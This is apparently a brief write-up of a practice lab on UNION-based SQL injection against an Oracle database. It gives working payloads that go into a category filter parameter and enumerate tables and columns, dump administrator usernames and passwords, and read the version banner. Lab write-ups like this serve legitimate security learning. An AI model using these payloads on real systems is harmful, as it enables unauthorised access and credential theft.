**Objective**
Reveal administrator username and password stored on SQL database to login.

**SQLi**
- Structured Query Language or SQL injection occurs when attacker sends malicious input to SQL database. 
- Lack of validation or sanitisation of input leaves the database vulnerable to exploitation of stored information.

**Point of Entry**
Discover that the category filter function is vulnerable to SQLi. 
- By replacing category filter value in GET request with SQL 1. `'+UNION+SELECT+'abc','def'+FROM+dual--.`
- Both `'abc'` and `'def'` are printed on the page. 
- This reveals category filter as point of entry for a similar query to print database details on page.

To retrieve sensitive user information, refer [SQL Cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- For a list of all data tables on database, replace category filter value with payload `'+UNION+SELECT+table_name,+NULL+FROM+all_tables--`
- Insert name of users table in payload and repeat attack for table name details  `'+UNION+SELECT+column_name,+NULL+FROM+all_tab_columns+WHERE+table_name='users_abcdef'--`
- Insert returned user details into payload to retrieve user details `'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--`

**Payload**`'+UNION+SELECT+BANNER,+NULL+FROM+v$version--`
